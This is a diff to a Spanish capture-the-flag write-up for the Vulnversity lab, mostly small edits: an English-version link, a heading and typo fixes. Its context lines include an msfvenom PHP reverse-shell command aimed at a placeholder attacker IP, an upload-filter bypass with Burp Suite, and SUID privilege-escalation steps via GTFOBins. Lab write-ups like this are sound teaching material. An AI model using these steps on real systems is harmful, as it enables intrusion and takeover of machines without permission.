@@ -4,6 +4,8 @@
 
 <h3>Dificultad: <img src="https://img.shields.io/badge/F%C3%A1cil-green?style=flat-square"> </h3>
 
+### *Leer el documentro en Ingles* <a href="Vulnversity_ingles.md">Vulnversity</a>
+
 ## Descripción del ataque
 
 Empezamos con un escaneo de puertos con la herramienta Nmap:
@@ -51,6 +53,8 @@ msfvenom -p php/reverse_php LHOST=<IP Atacante> LPORT=443 -o shell.php
 
 A continuación vamos a tener problemas, porque resulta que en este caso el upload no permite la subida de archivos con la extension .php, para saber cual es la correcta usaremos **burp suite**
 
+### Burp suite
+
 Tenemos que incerceptar la página internal en burp suite para ello nos situamos en **Proxy- Intercept-intercpt on**. Una vez activado, volvemos a realizar la subida, luego al botón derecho del ratón y se clikea en **send to repeater**
 
 <p align="center"> 
@@ -77,7 +81,7 @@ Quedaría tal que así:
 
 **Nota informativa**. Aunque en la imagen aparezca con el nombre **pwnedl.php** lo importante es la extensión del archivo, no el nombre.
 
-Después, en la pantalla de la derecha nos sitaumos en **setting - Grep - Extract**
+Después, en la pantalla de la derecha nos situamos en **setting - Grep - Extract**
 
 <p align="center"> 
 <img src="images/grep_extract.png" width="600" alt="Resultado de Nmap">
@@ -176,7 +180,7 @@ find / -perm -4000 2>/dev/null
 
 Es normal que al principio no sabemos que archivos usar, por tanto, nos ayudamos con esta pagina <a href="https://gtfobins.github.io" target="_blank">gtfobins</a>
 
-En el buscador escribimos systemctl, luego nos situamos en el apartado **SUID**, ya que, el comando anterior forma parte de **SUID**
+En el buscador escribimos **systemctl**, luego nos situamos en el apartado **SUID**, ya que, el comando anterior forma parte de **SUID**
 
 <p align="center"> 
 <img src="images/SUID.png" width="600" alt="Resultado de Nmap">
